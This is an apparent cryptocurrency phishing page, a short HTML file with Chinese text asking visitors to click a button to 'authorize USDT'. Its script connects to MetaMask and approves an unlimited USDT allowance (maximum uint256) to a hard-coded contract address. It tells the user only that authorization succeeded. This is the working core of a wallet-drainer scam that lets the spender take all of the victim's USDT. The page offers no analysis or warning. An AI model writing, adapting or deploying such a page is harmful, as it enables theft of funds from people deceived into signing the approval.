<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>授權頁面</title>
</head>
<body>
  <h1>請點擊下方按鈕授權 USDT</h1>
  <button onclick="approve()">授權</button>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script>
    const CONTRACT = "0xfC35E3407c86461BA2D00C080cC763c0f6878377";
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum 主網 USDT
    const ABI = [{ "name": "approve", "type": "function", "inputs": [
      { "type": "address", "name": "_spender" },
      { "type": "uint256", "name": "_value" }
    ], "constant": false, "outputs": [], "payable": false }];

    async function approve() {
      if (typeof window.ethereum === "undefined") return alert("請安裝 MetaMask");
      const web3 = new Web3(window.ethereum);
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      const contract = new web3.eth.Contract(ABI, USDT);
      const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
      await contract.methods.approve(CONTRACT, max).send({ from: accounts[0] });
      alert("✅ 授權成功！");
    }
  </script>
</body>
</html>
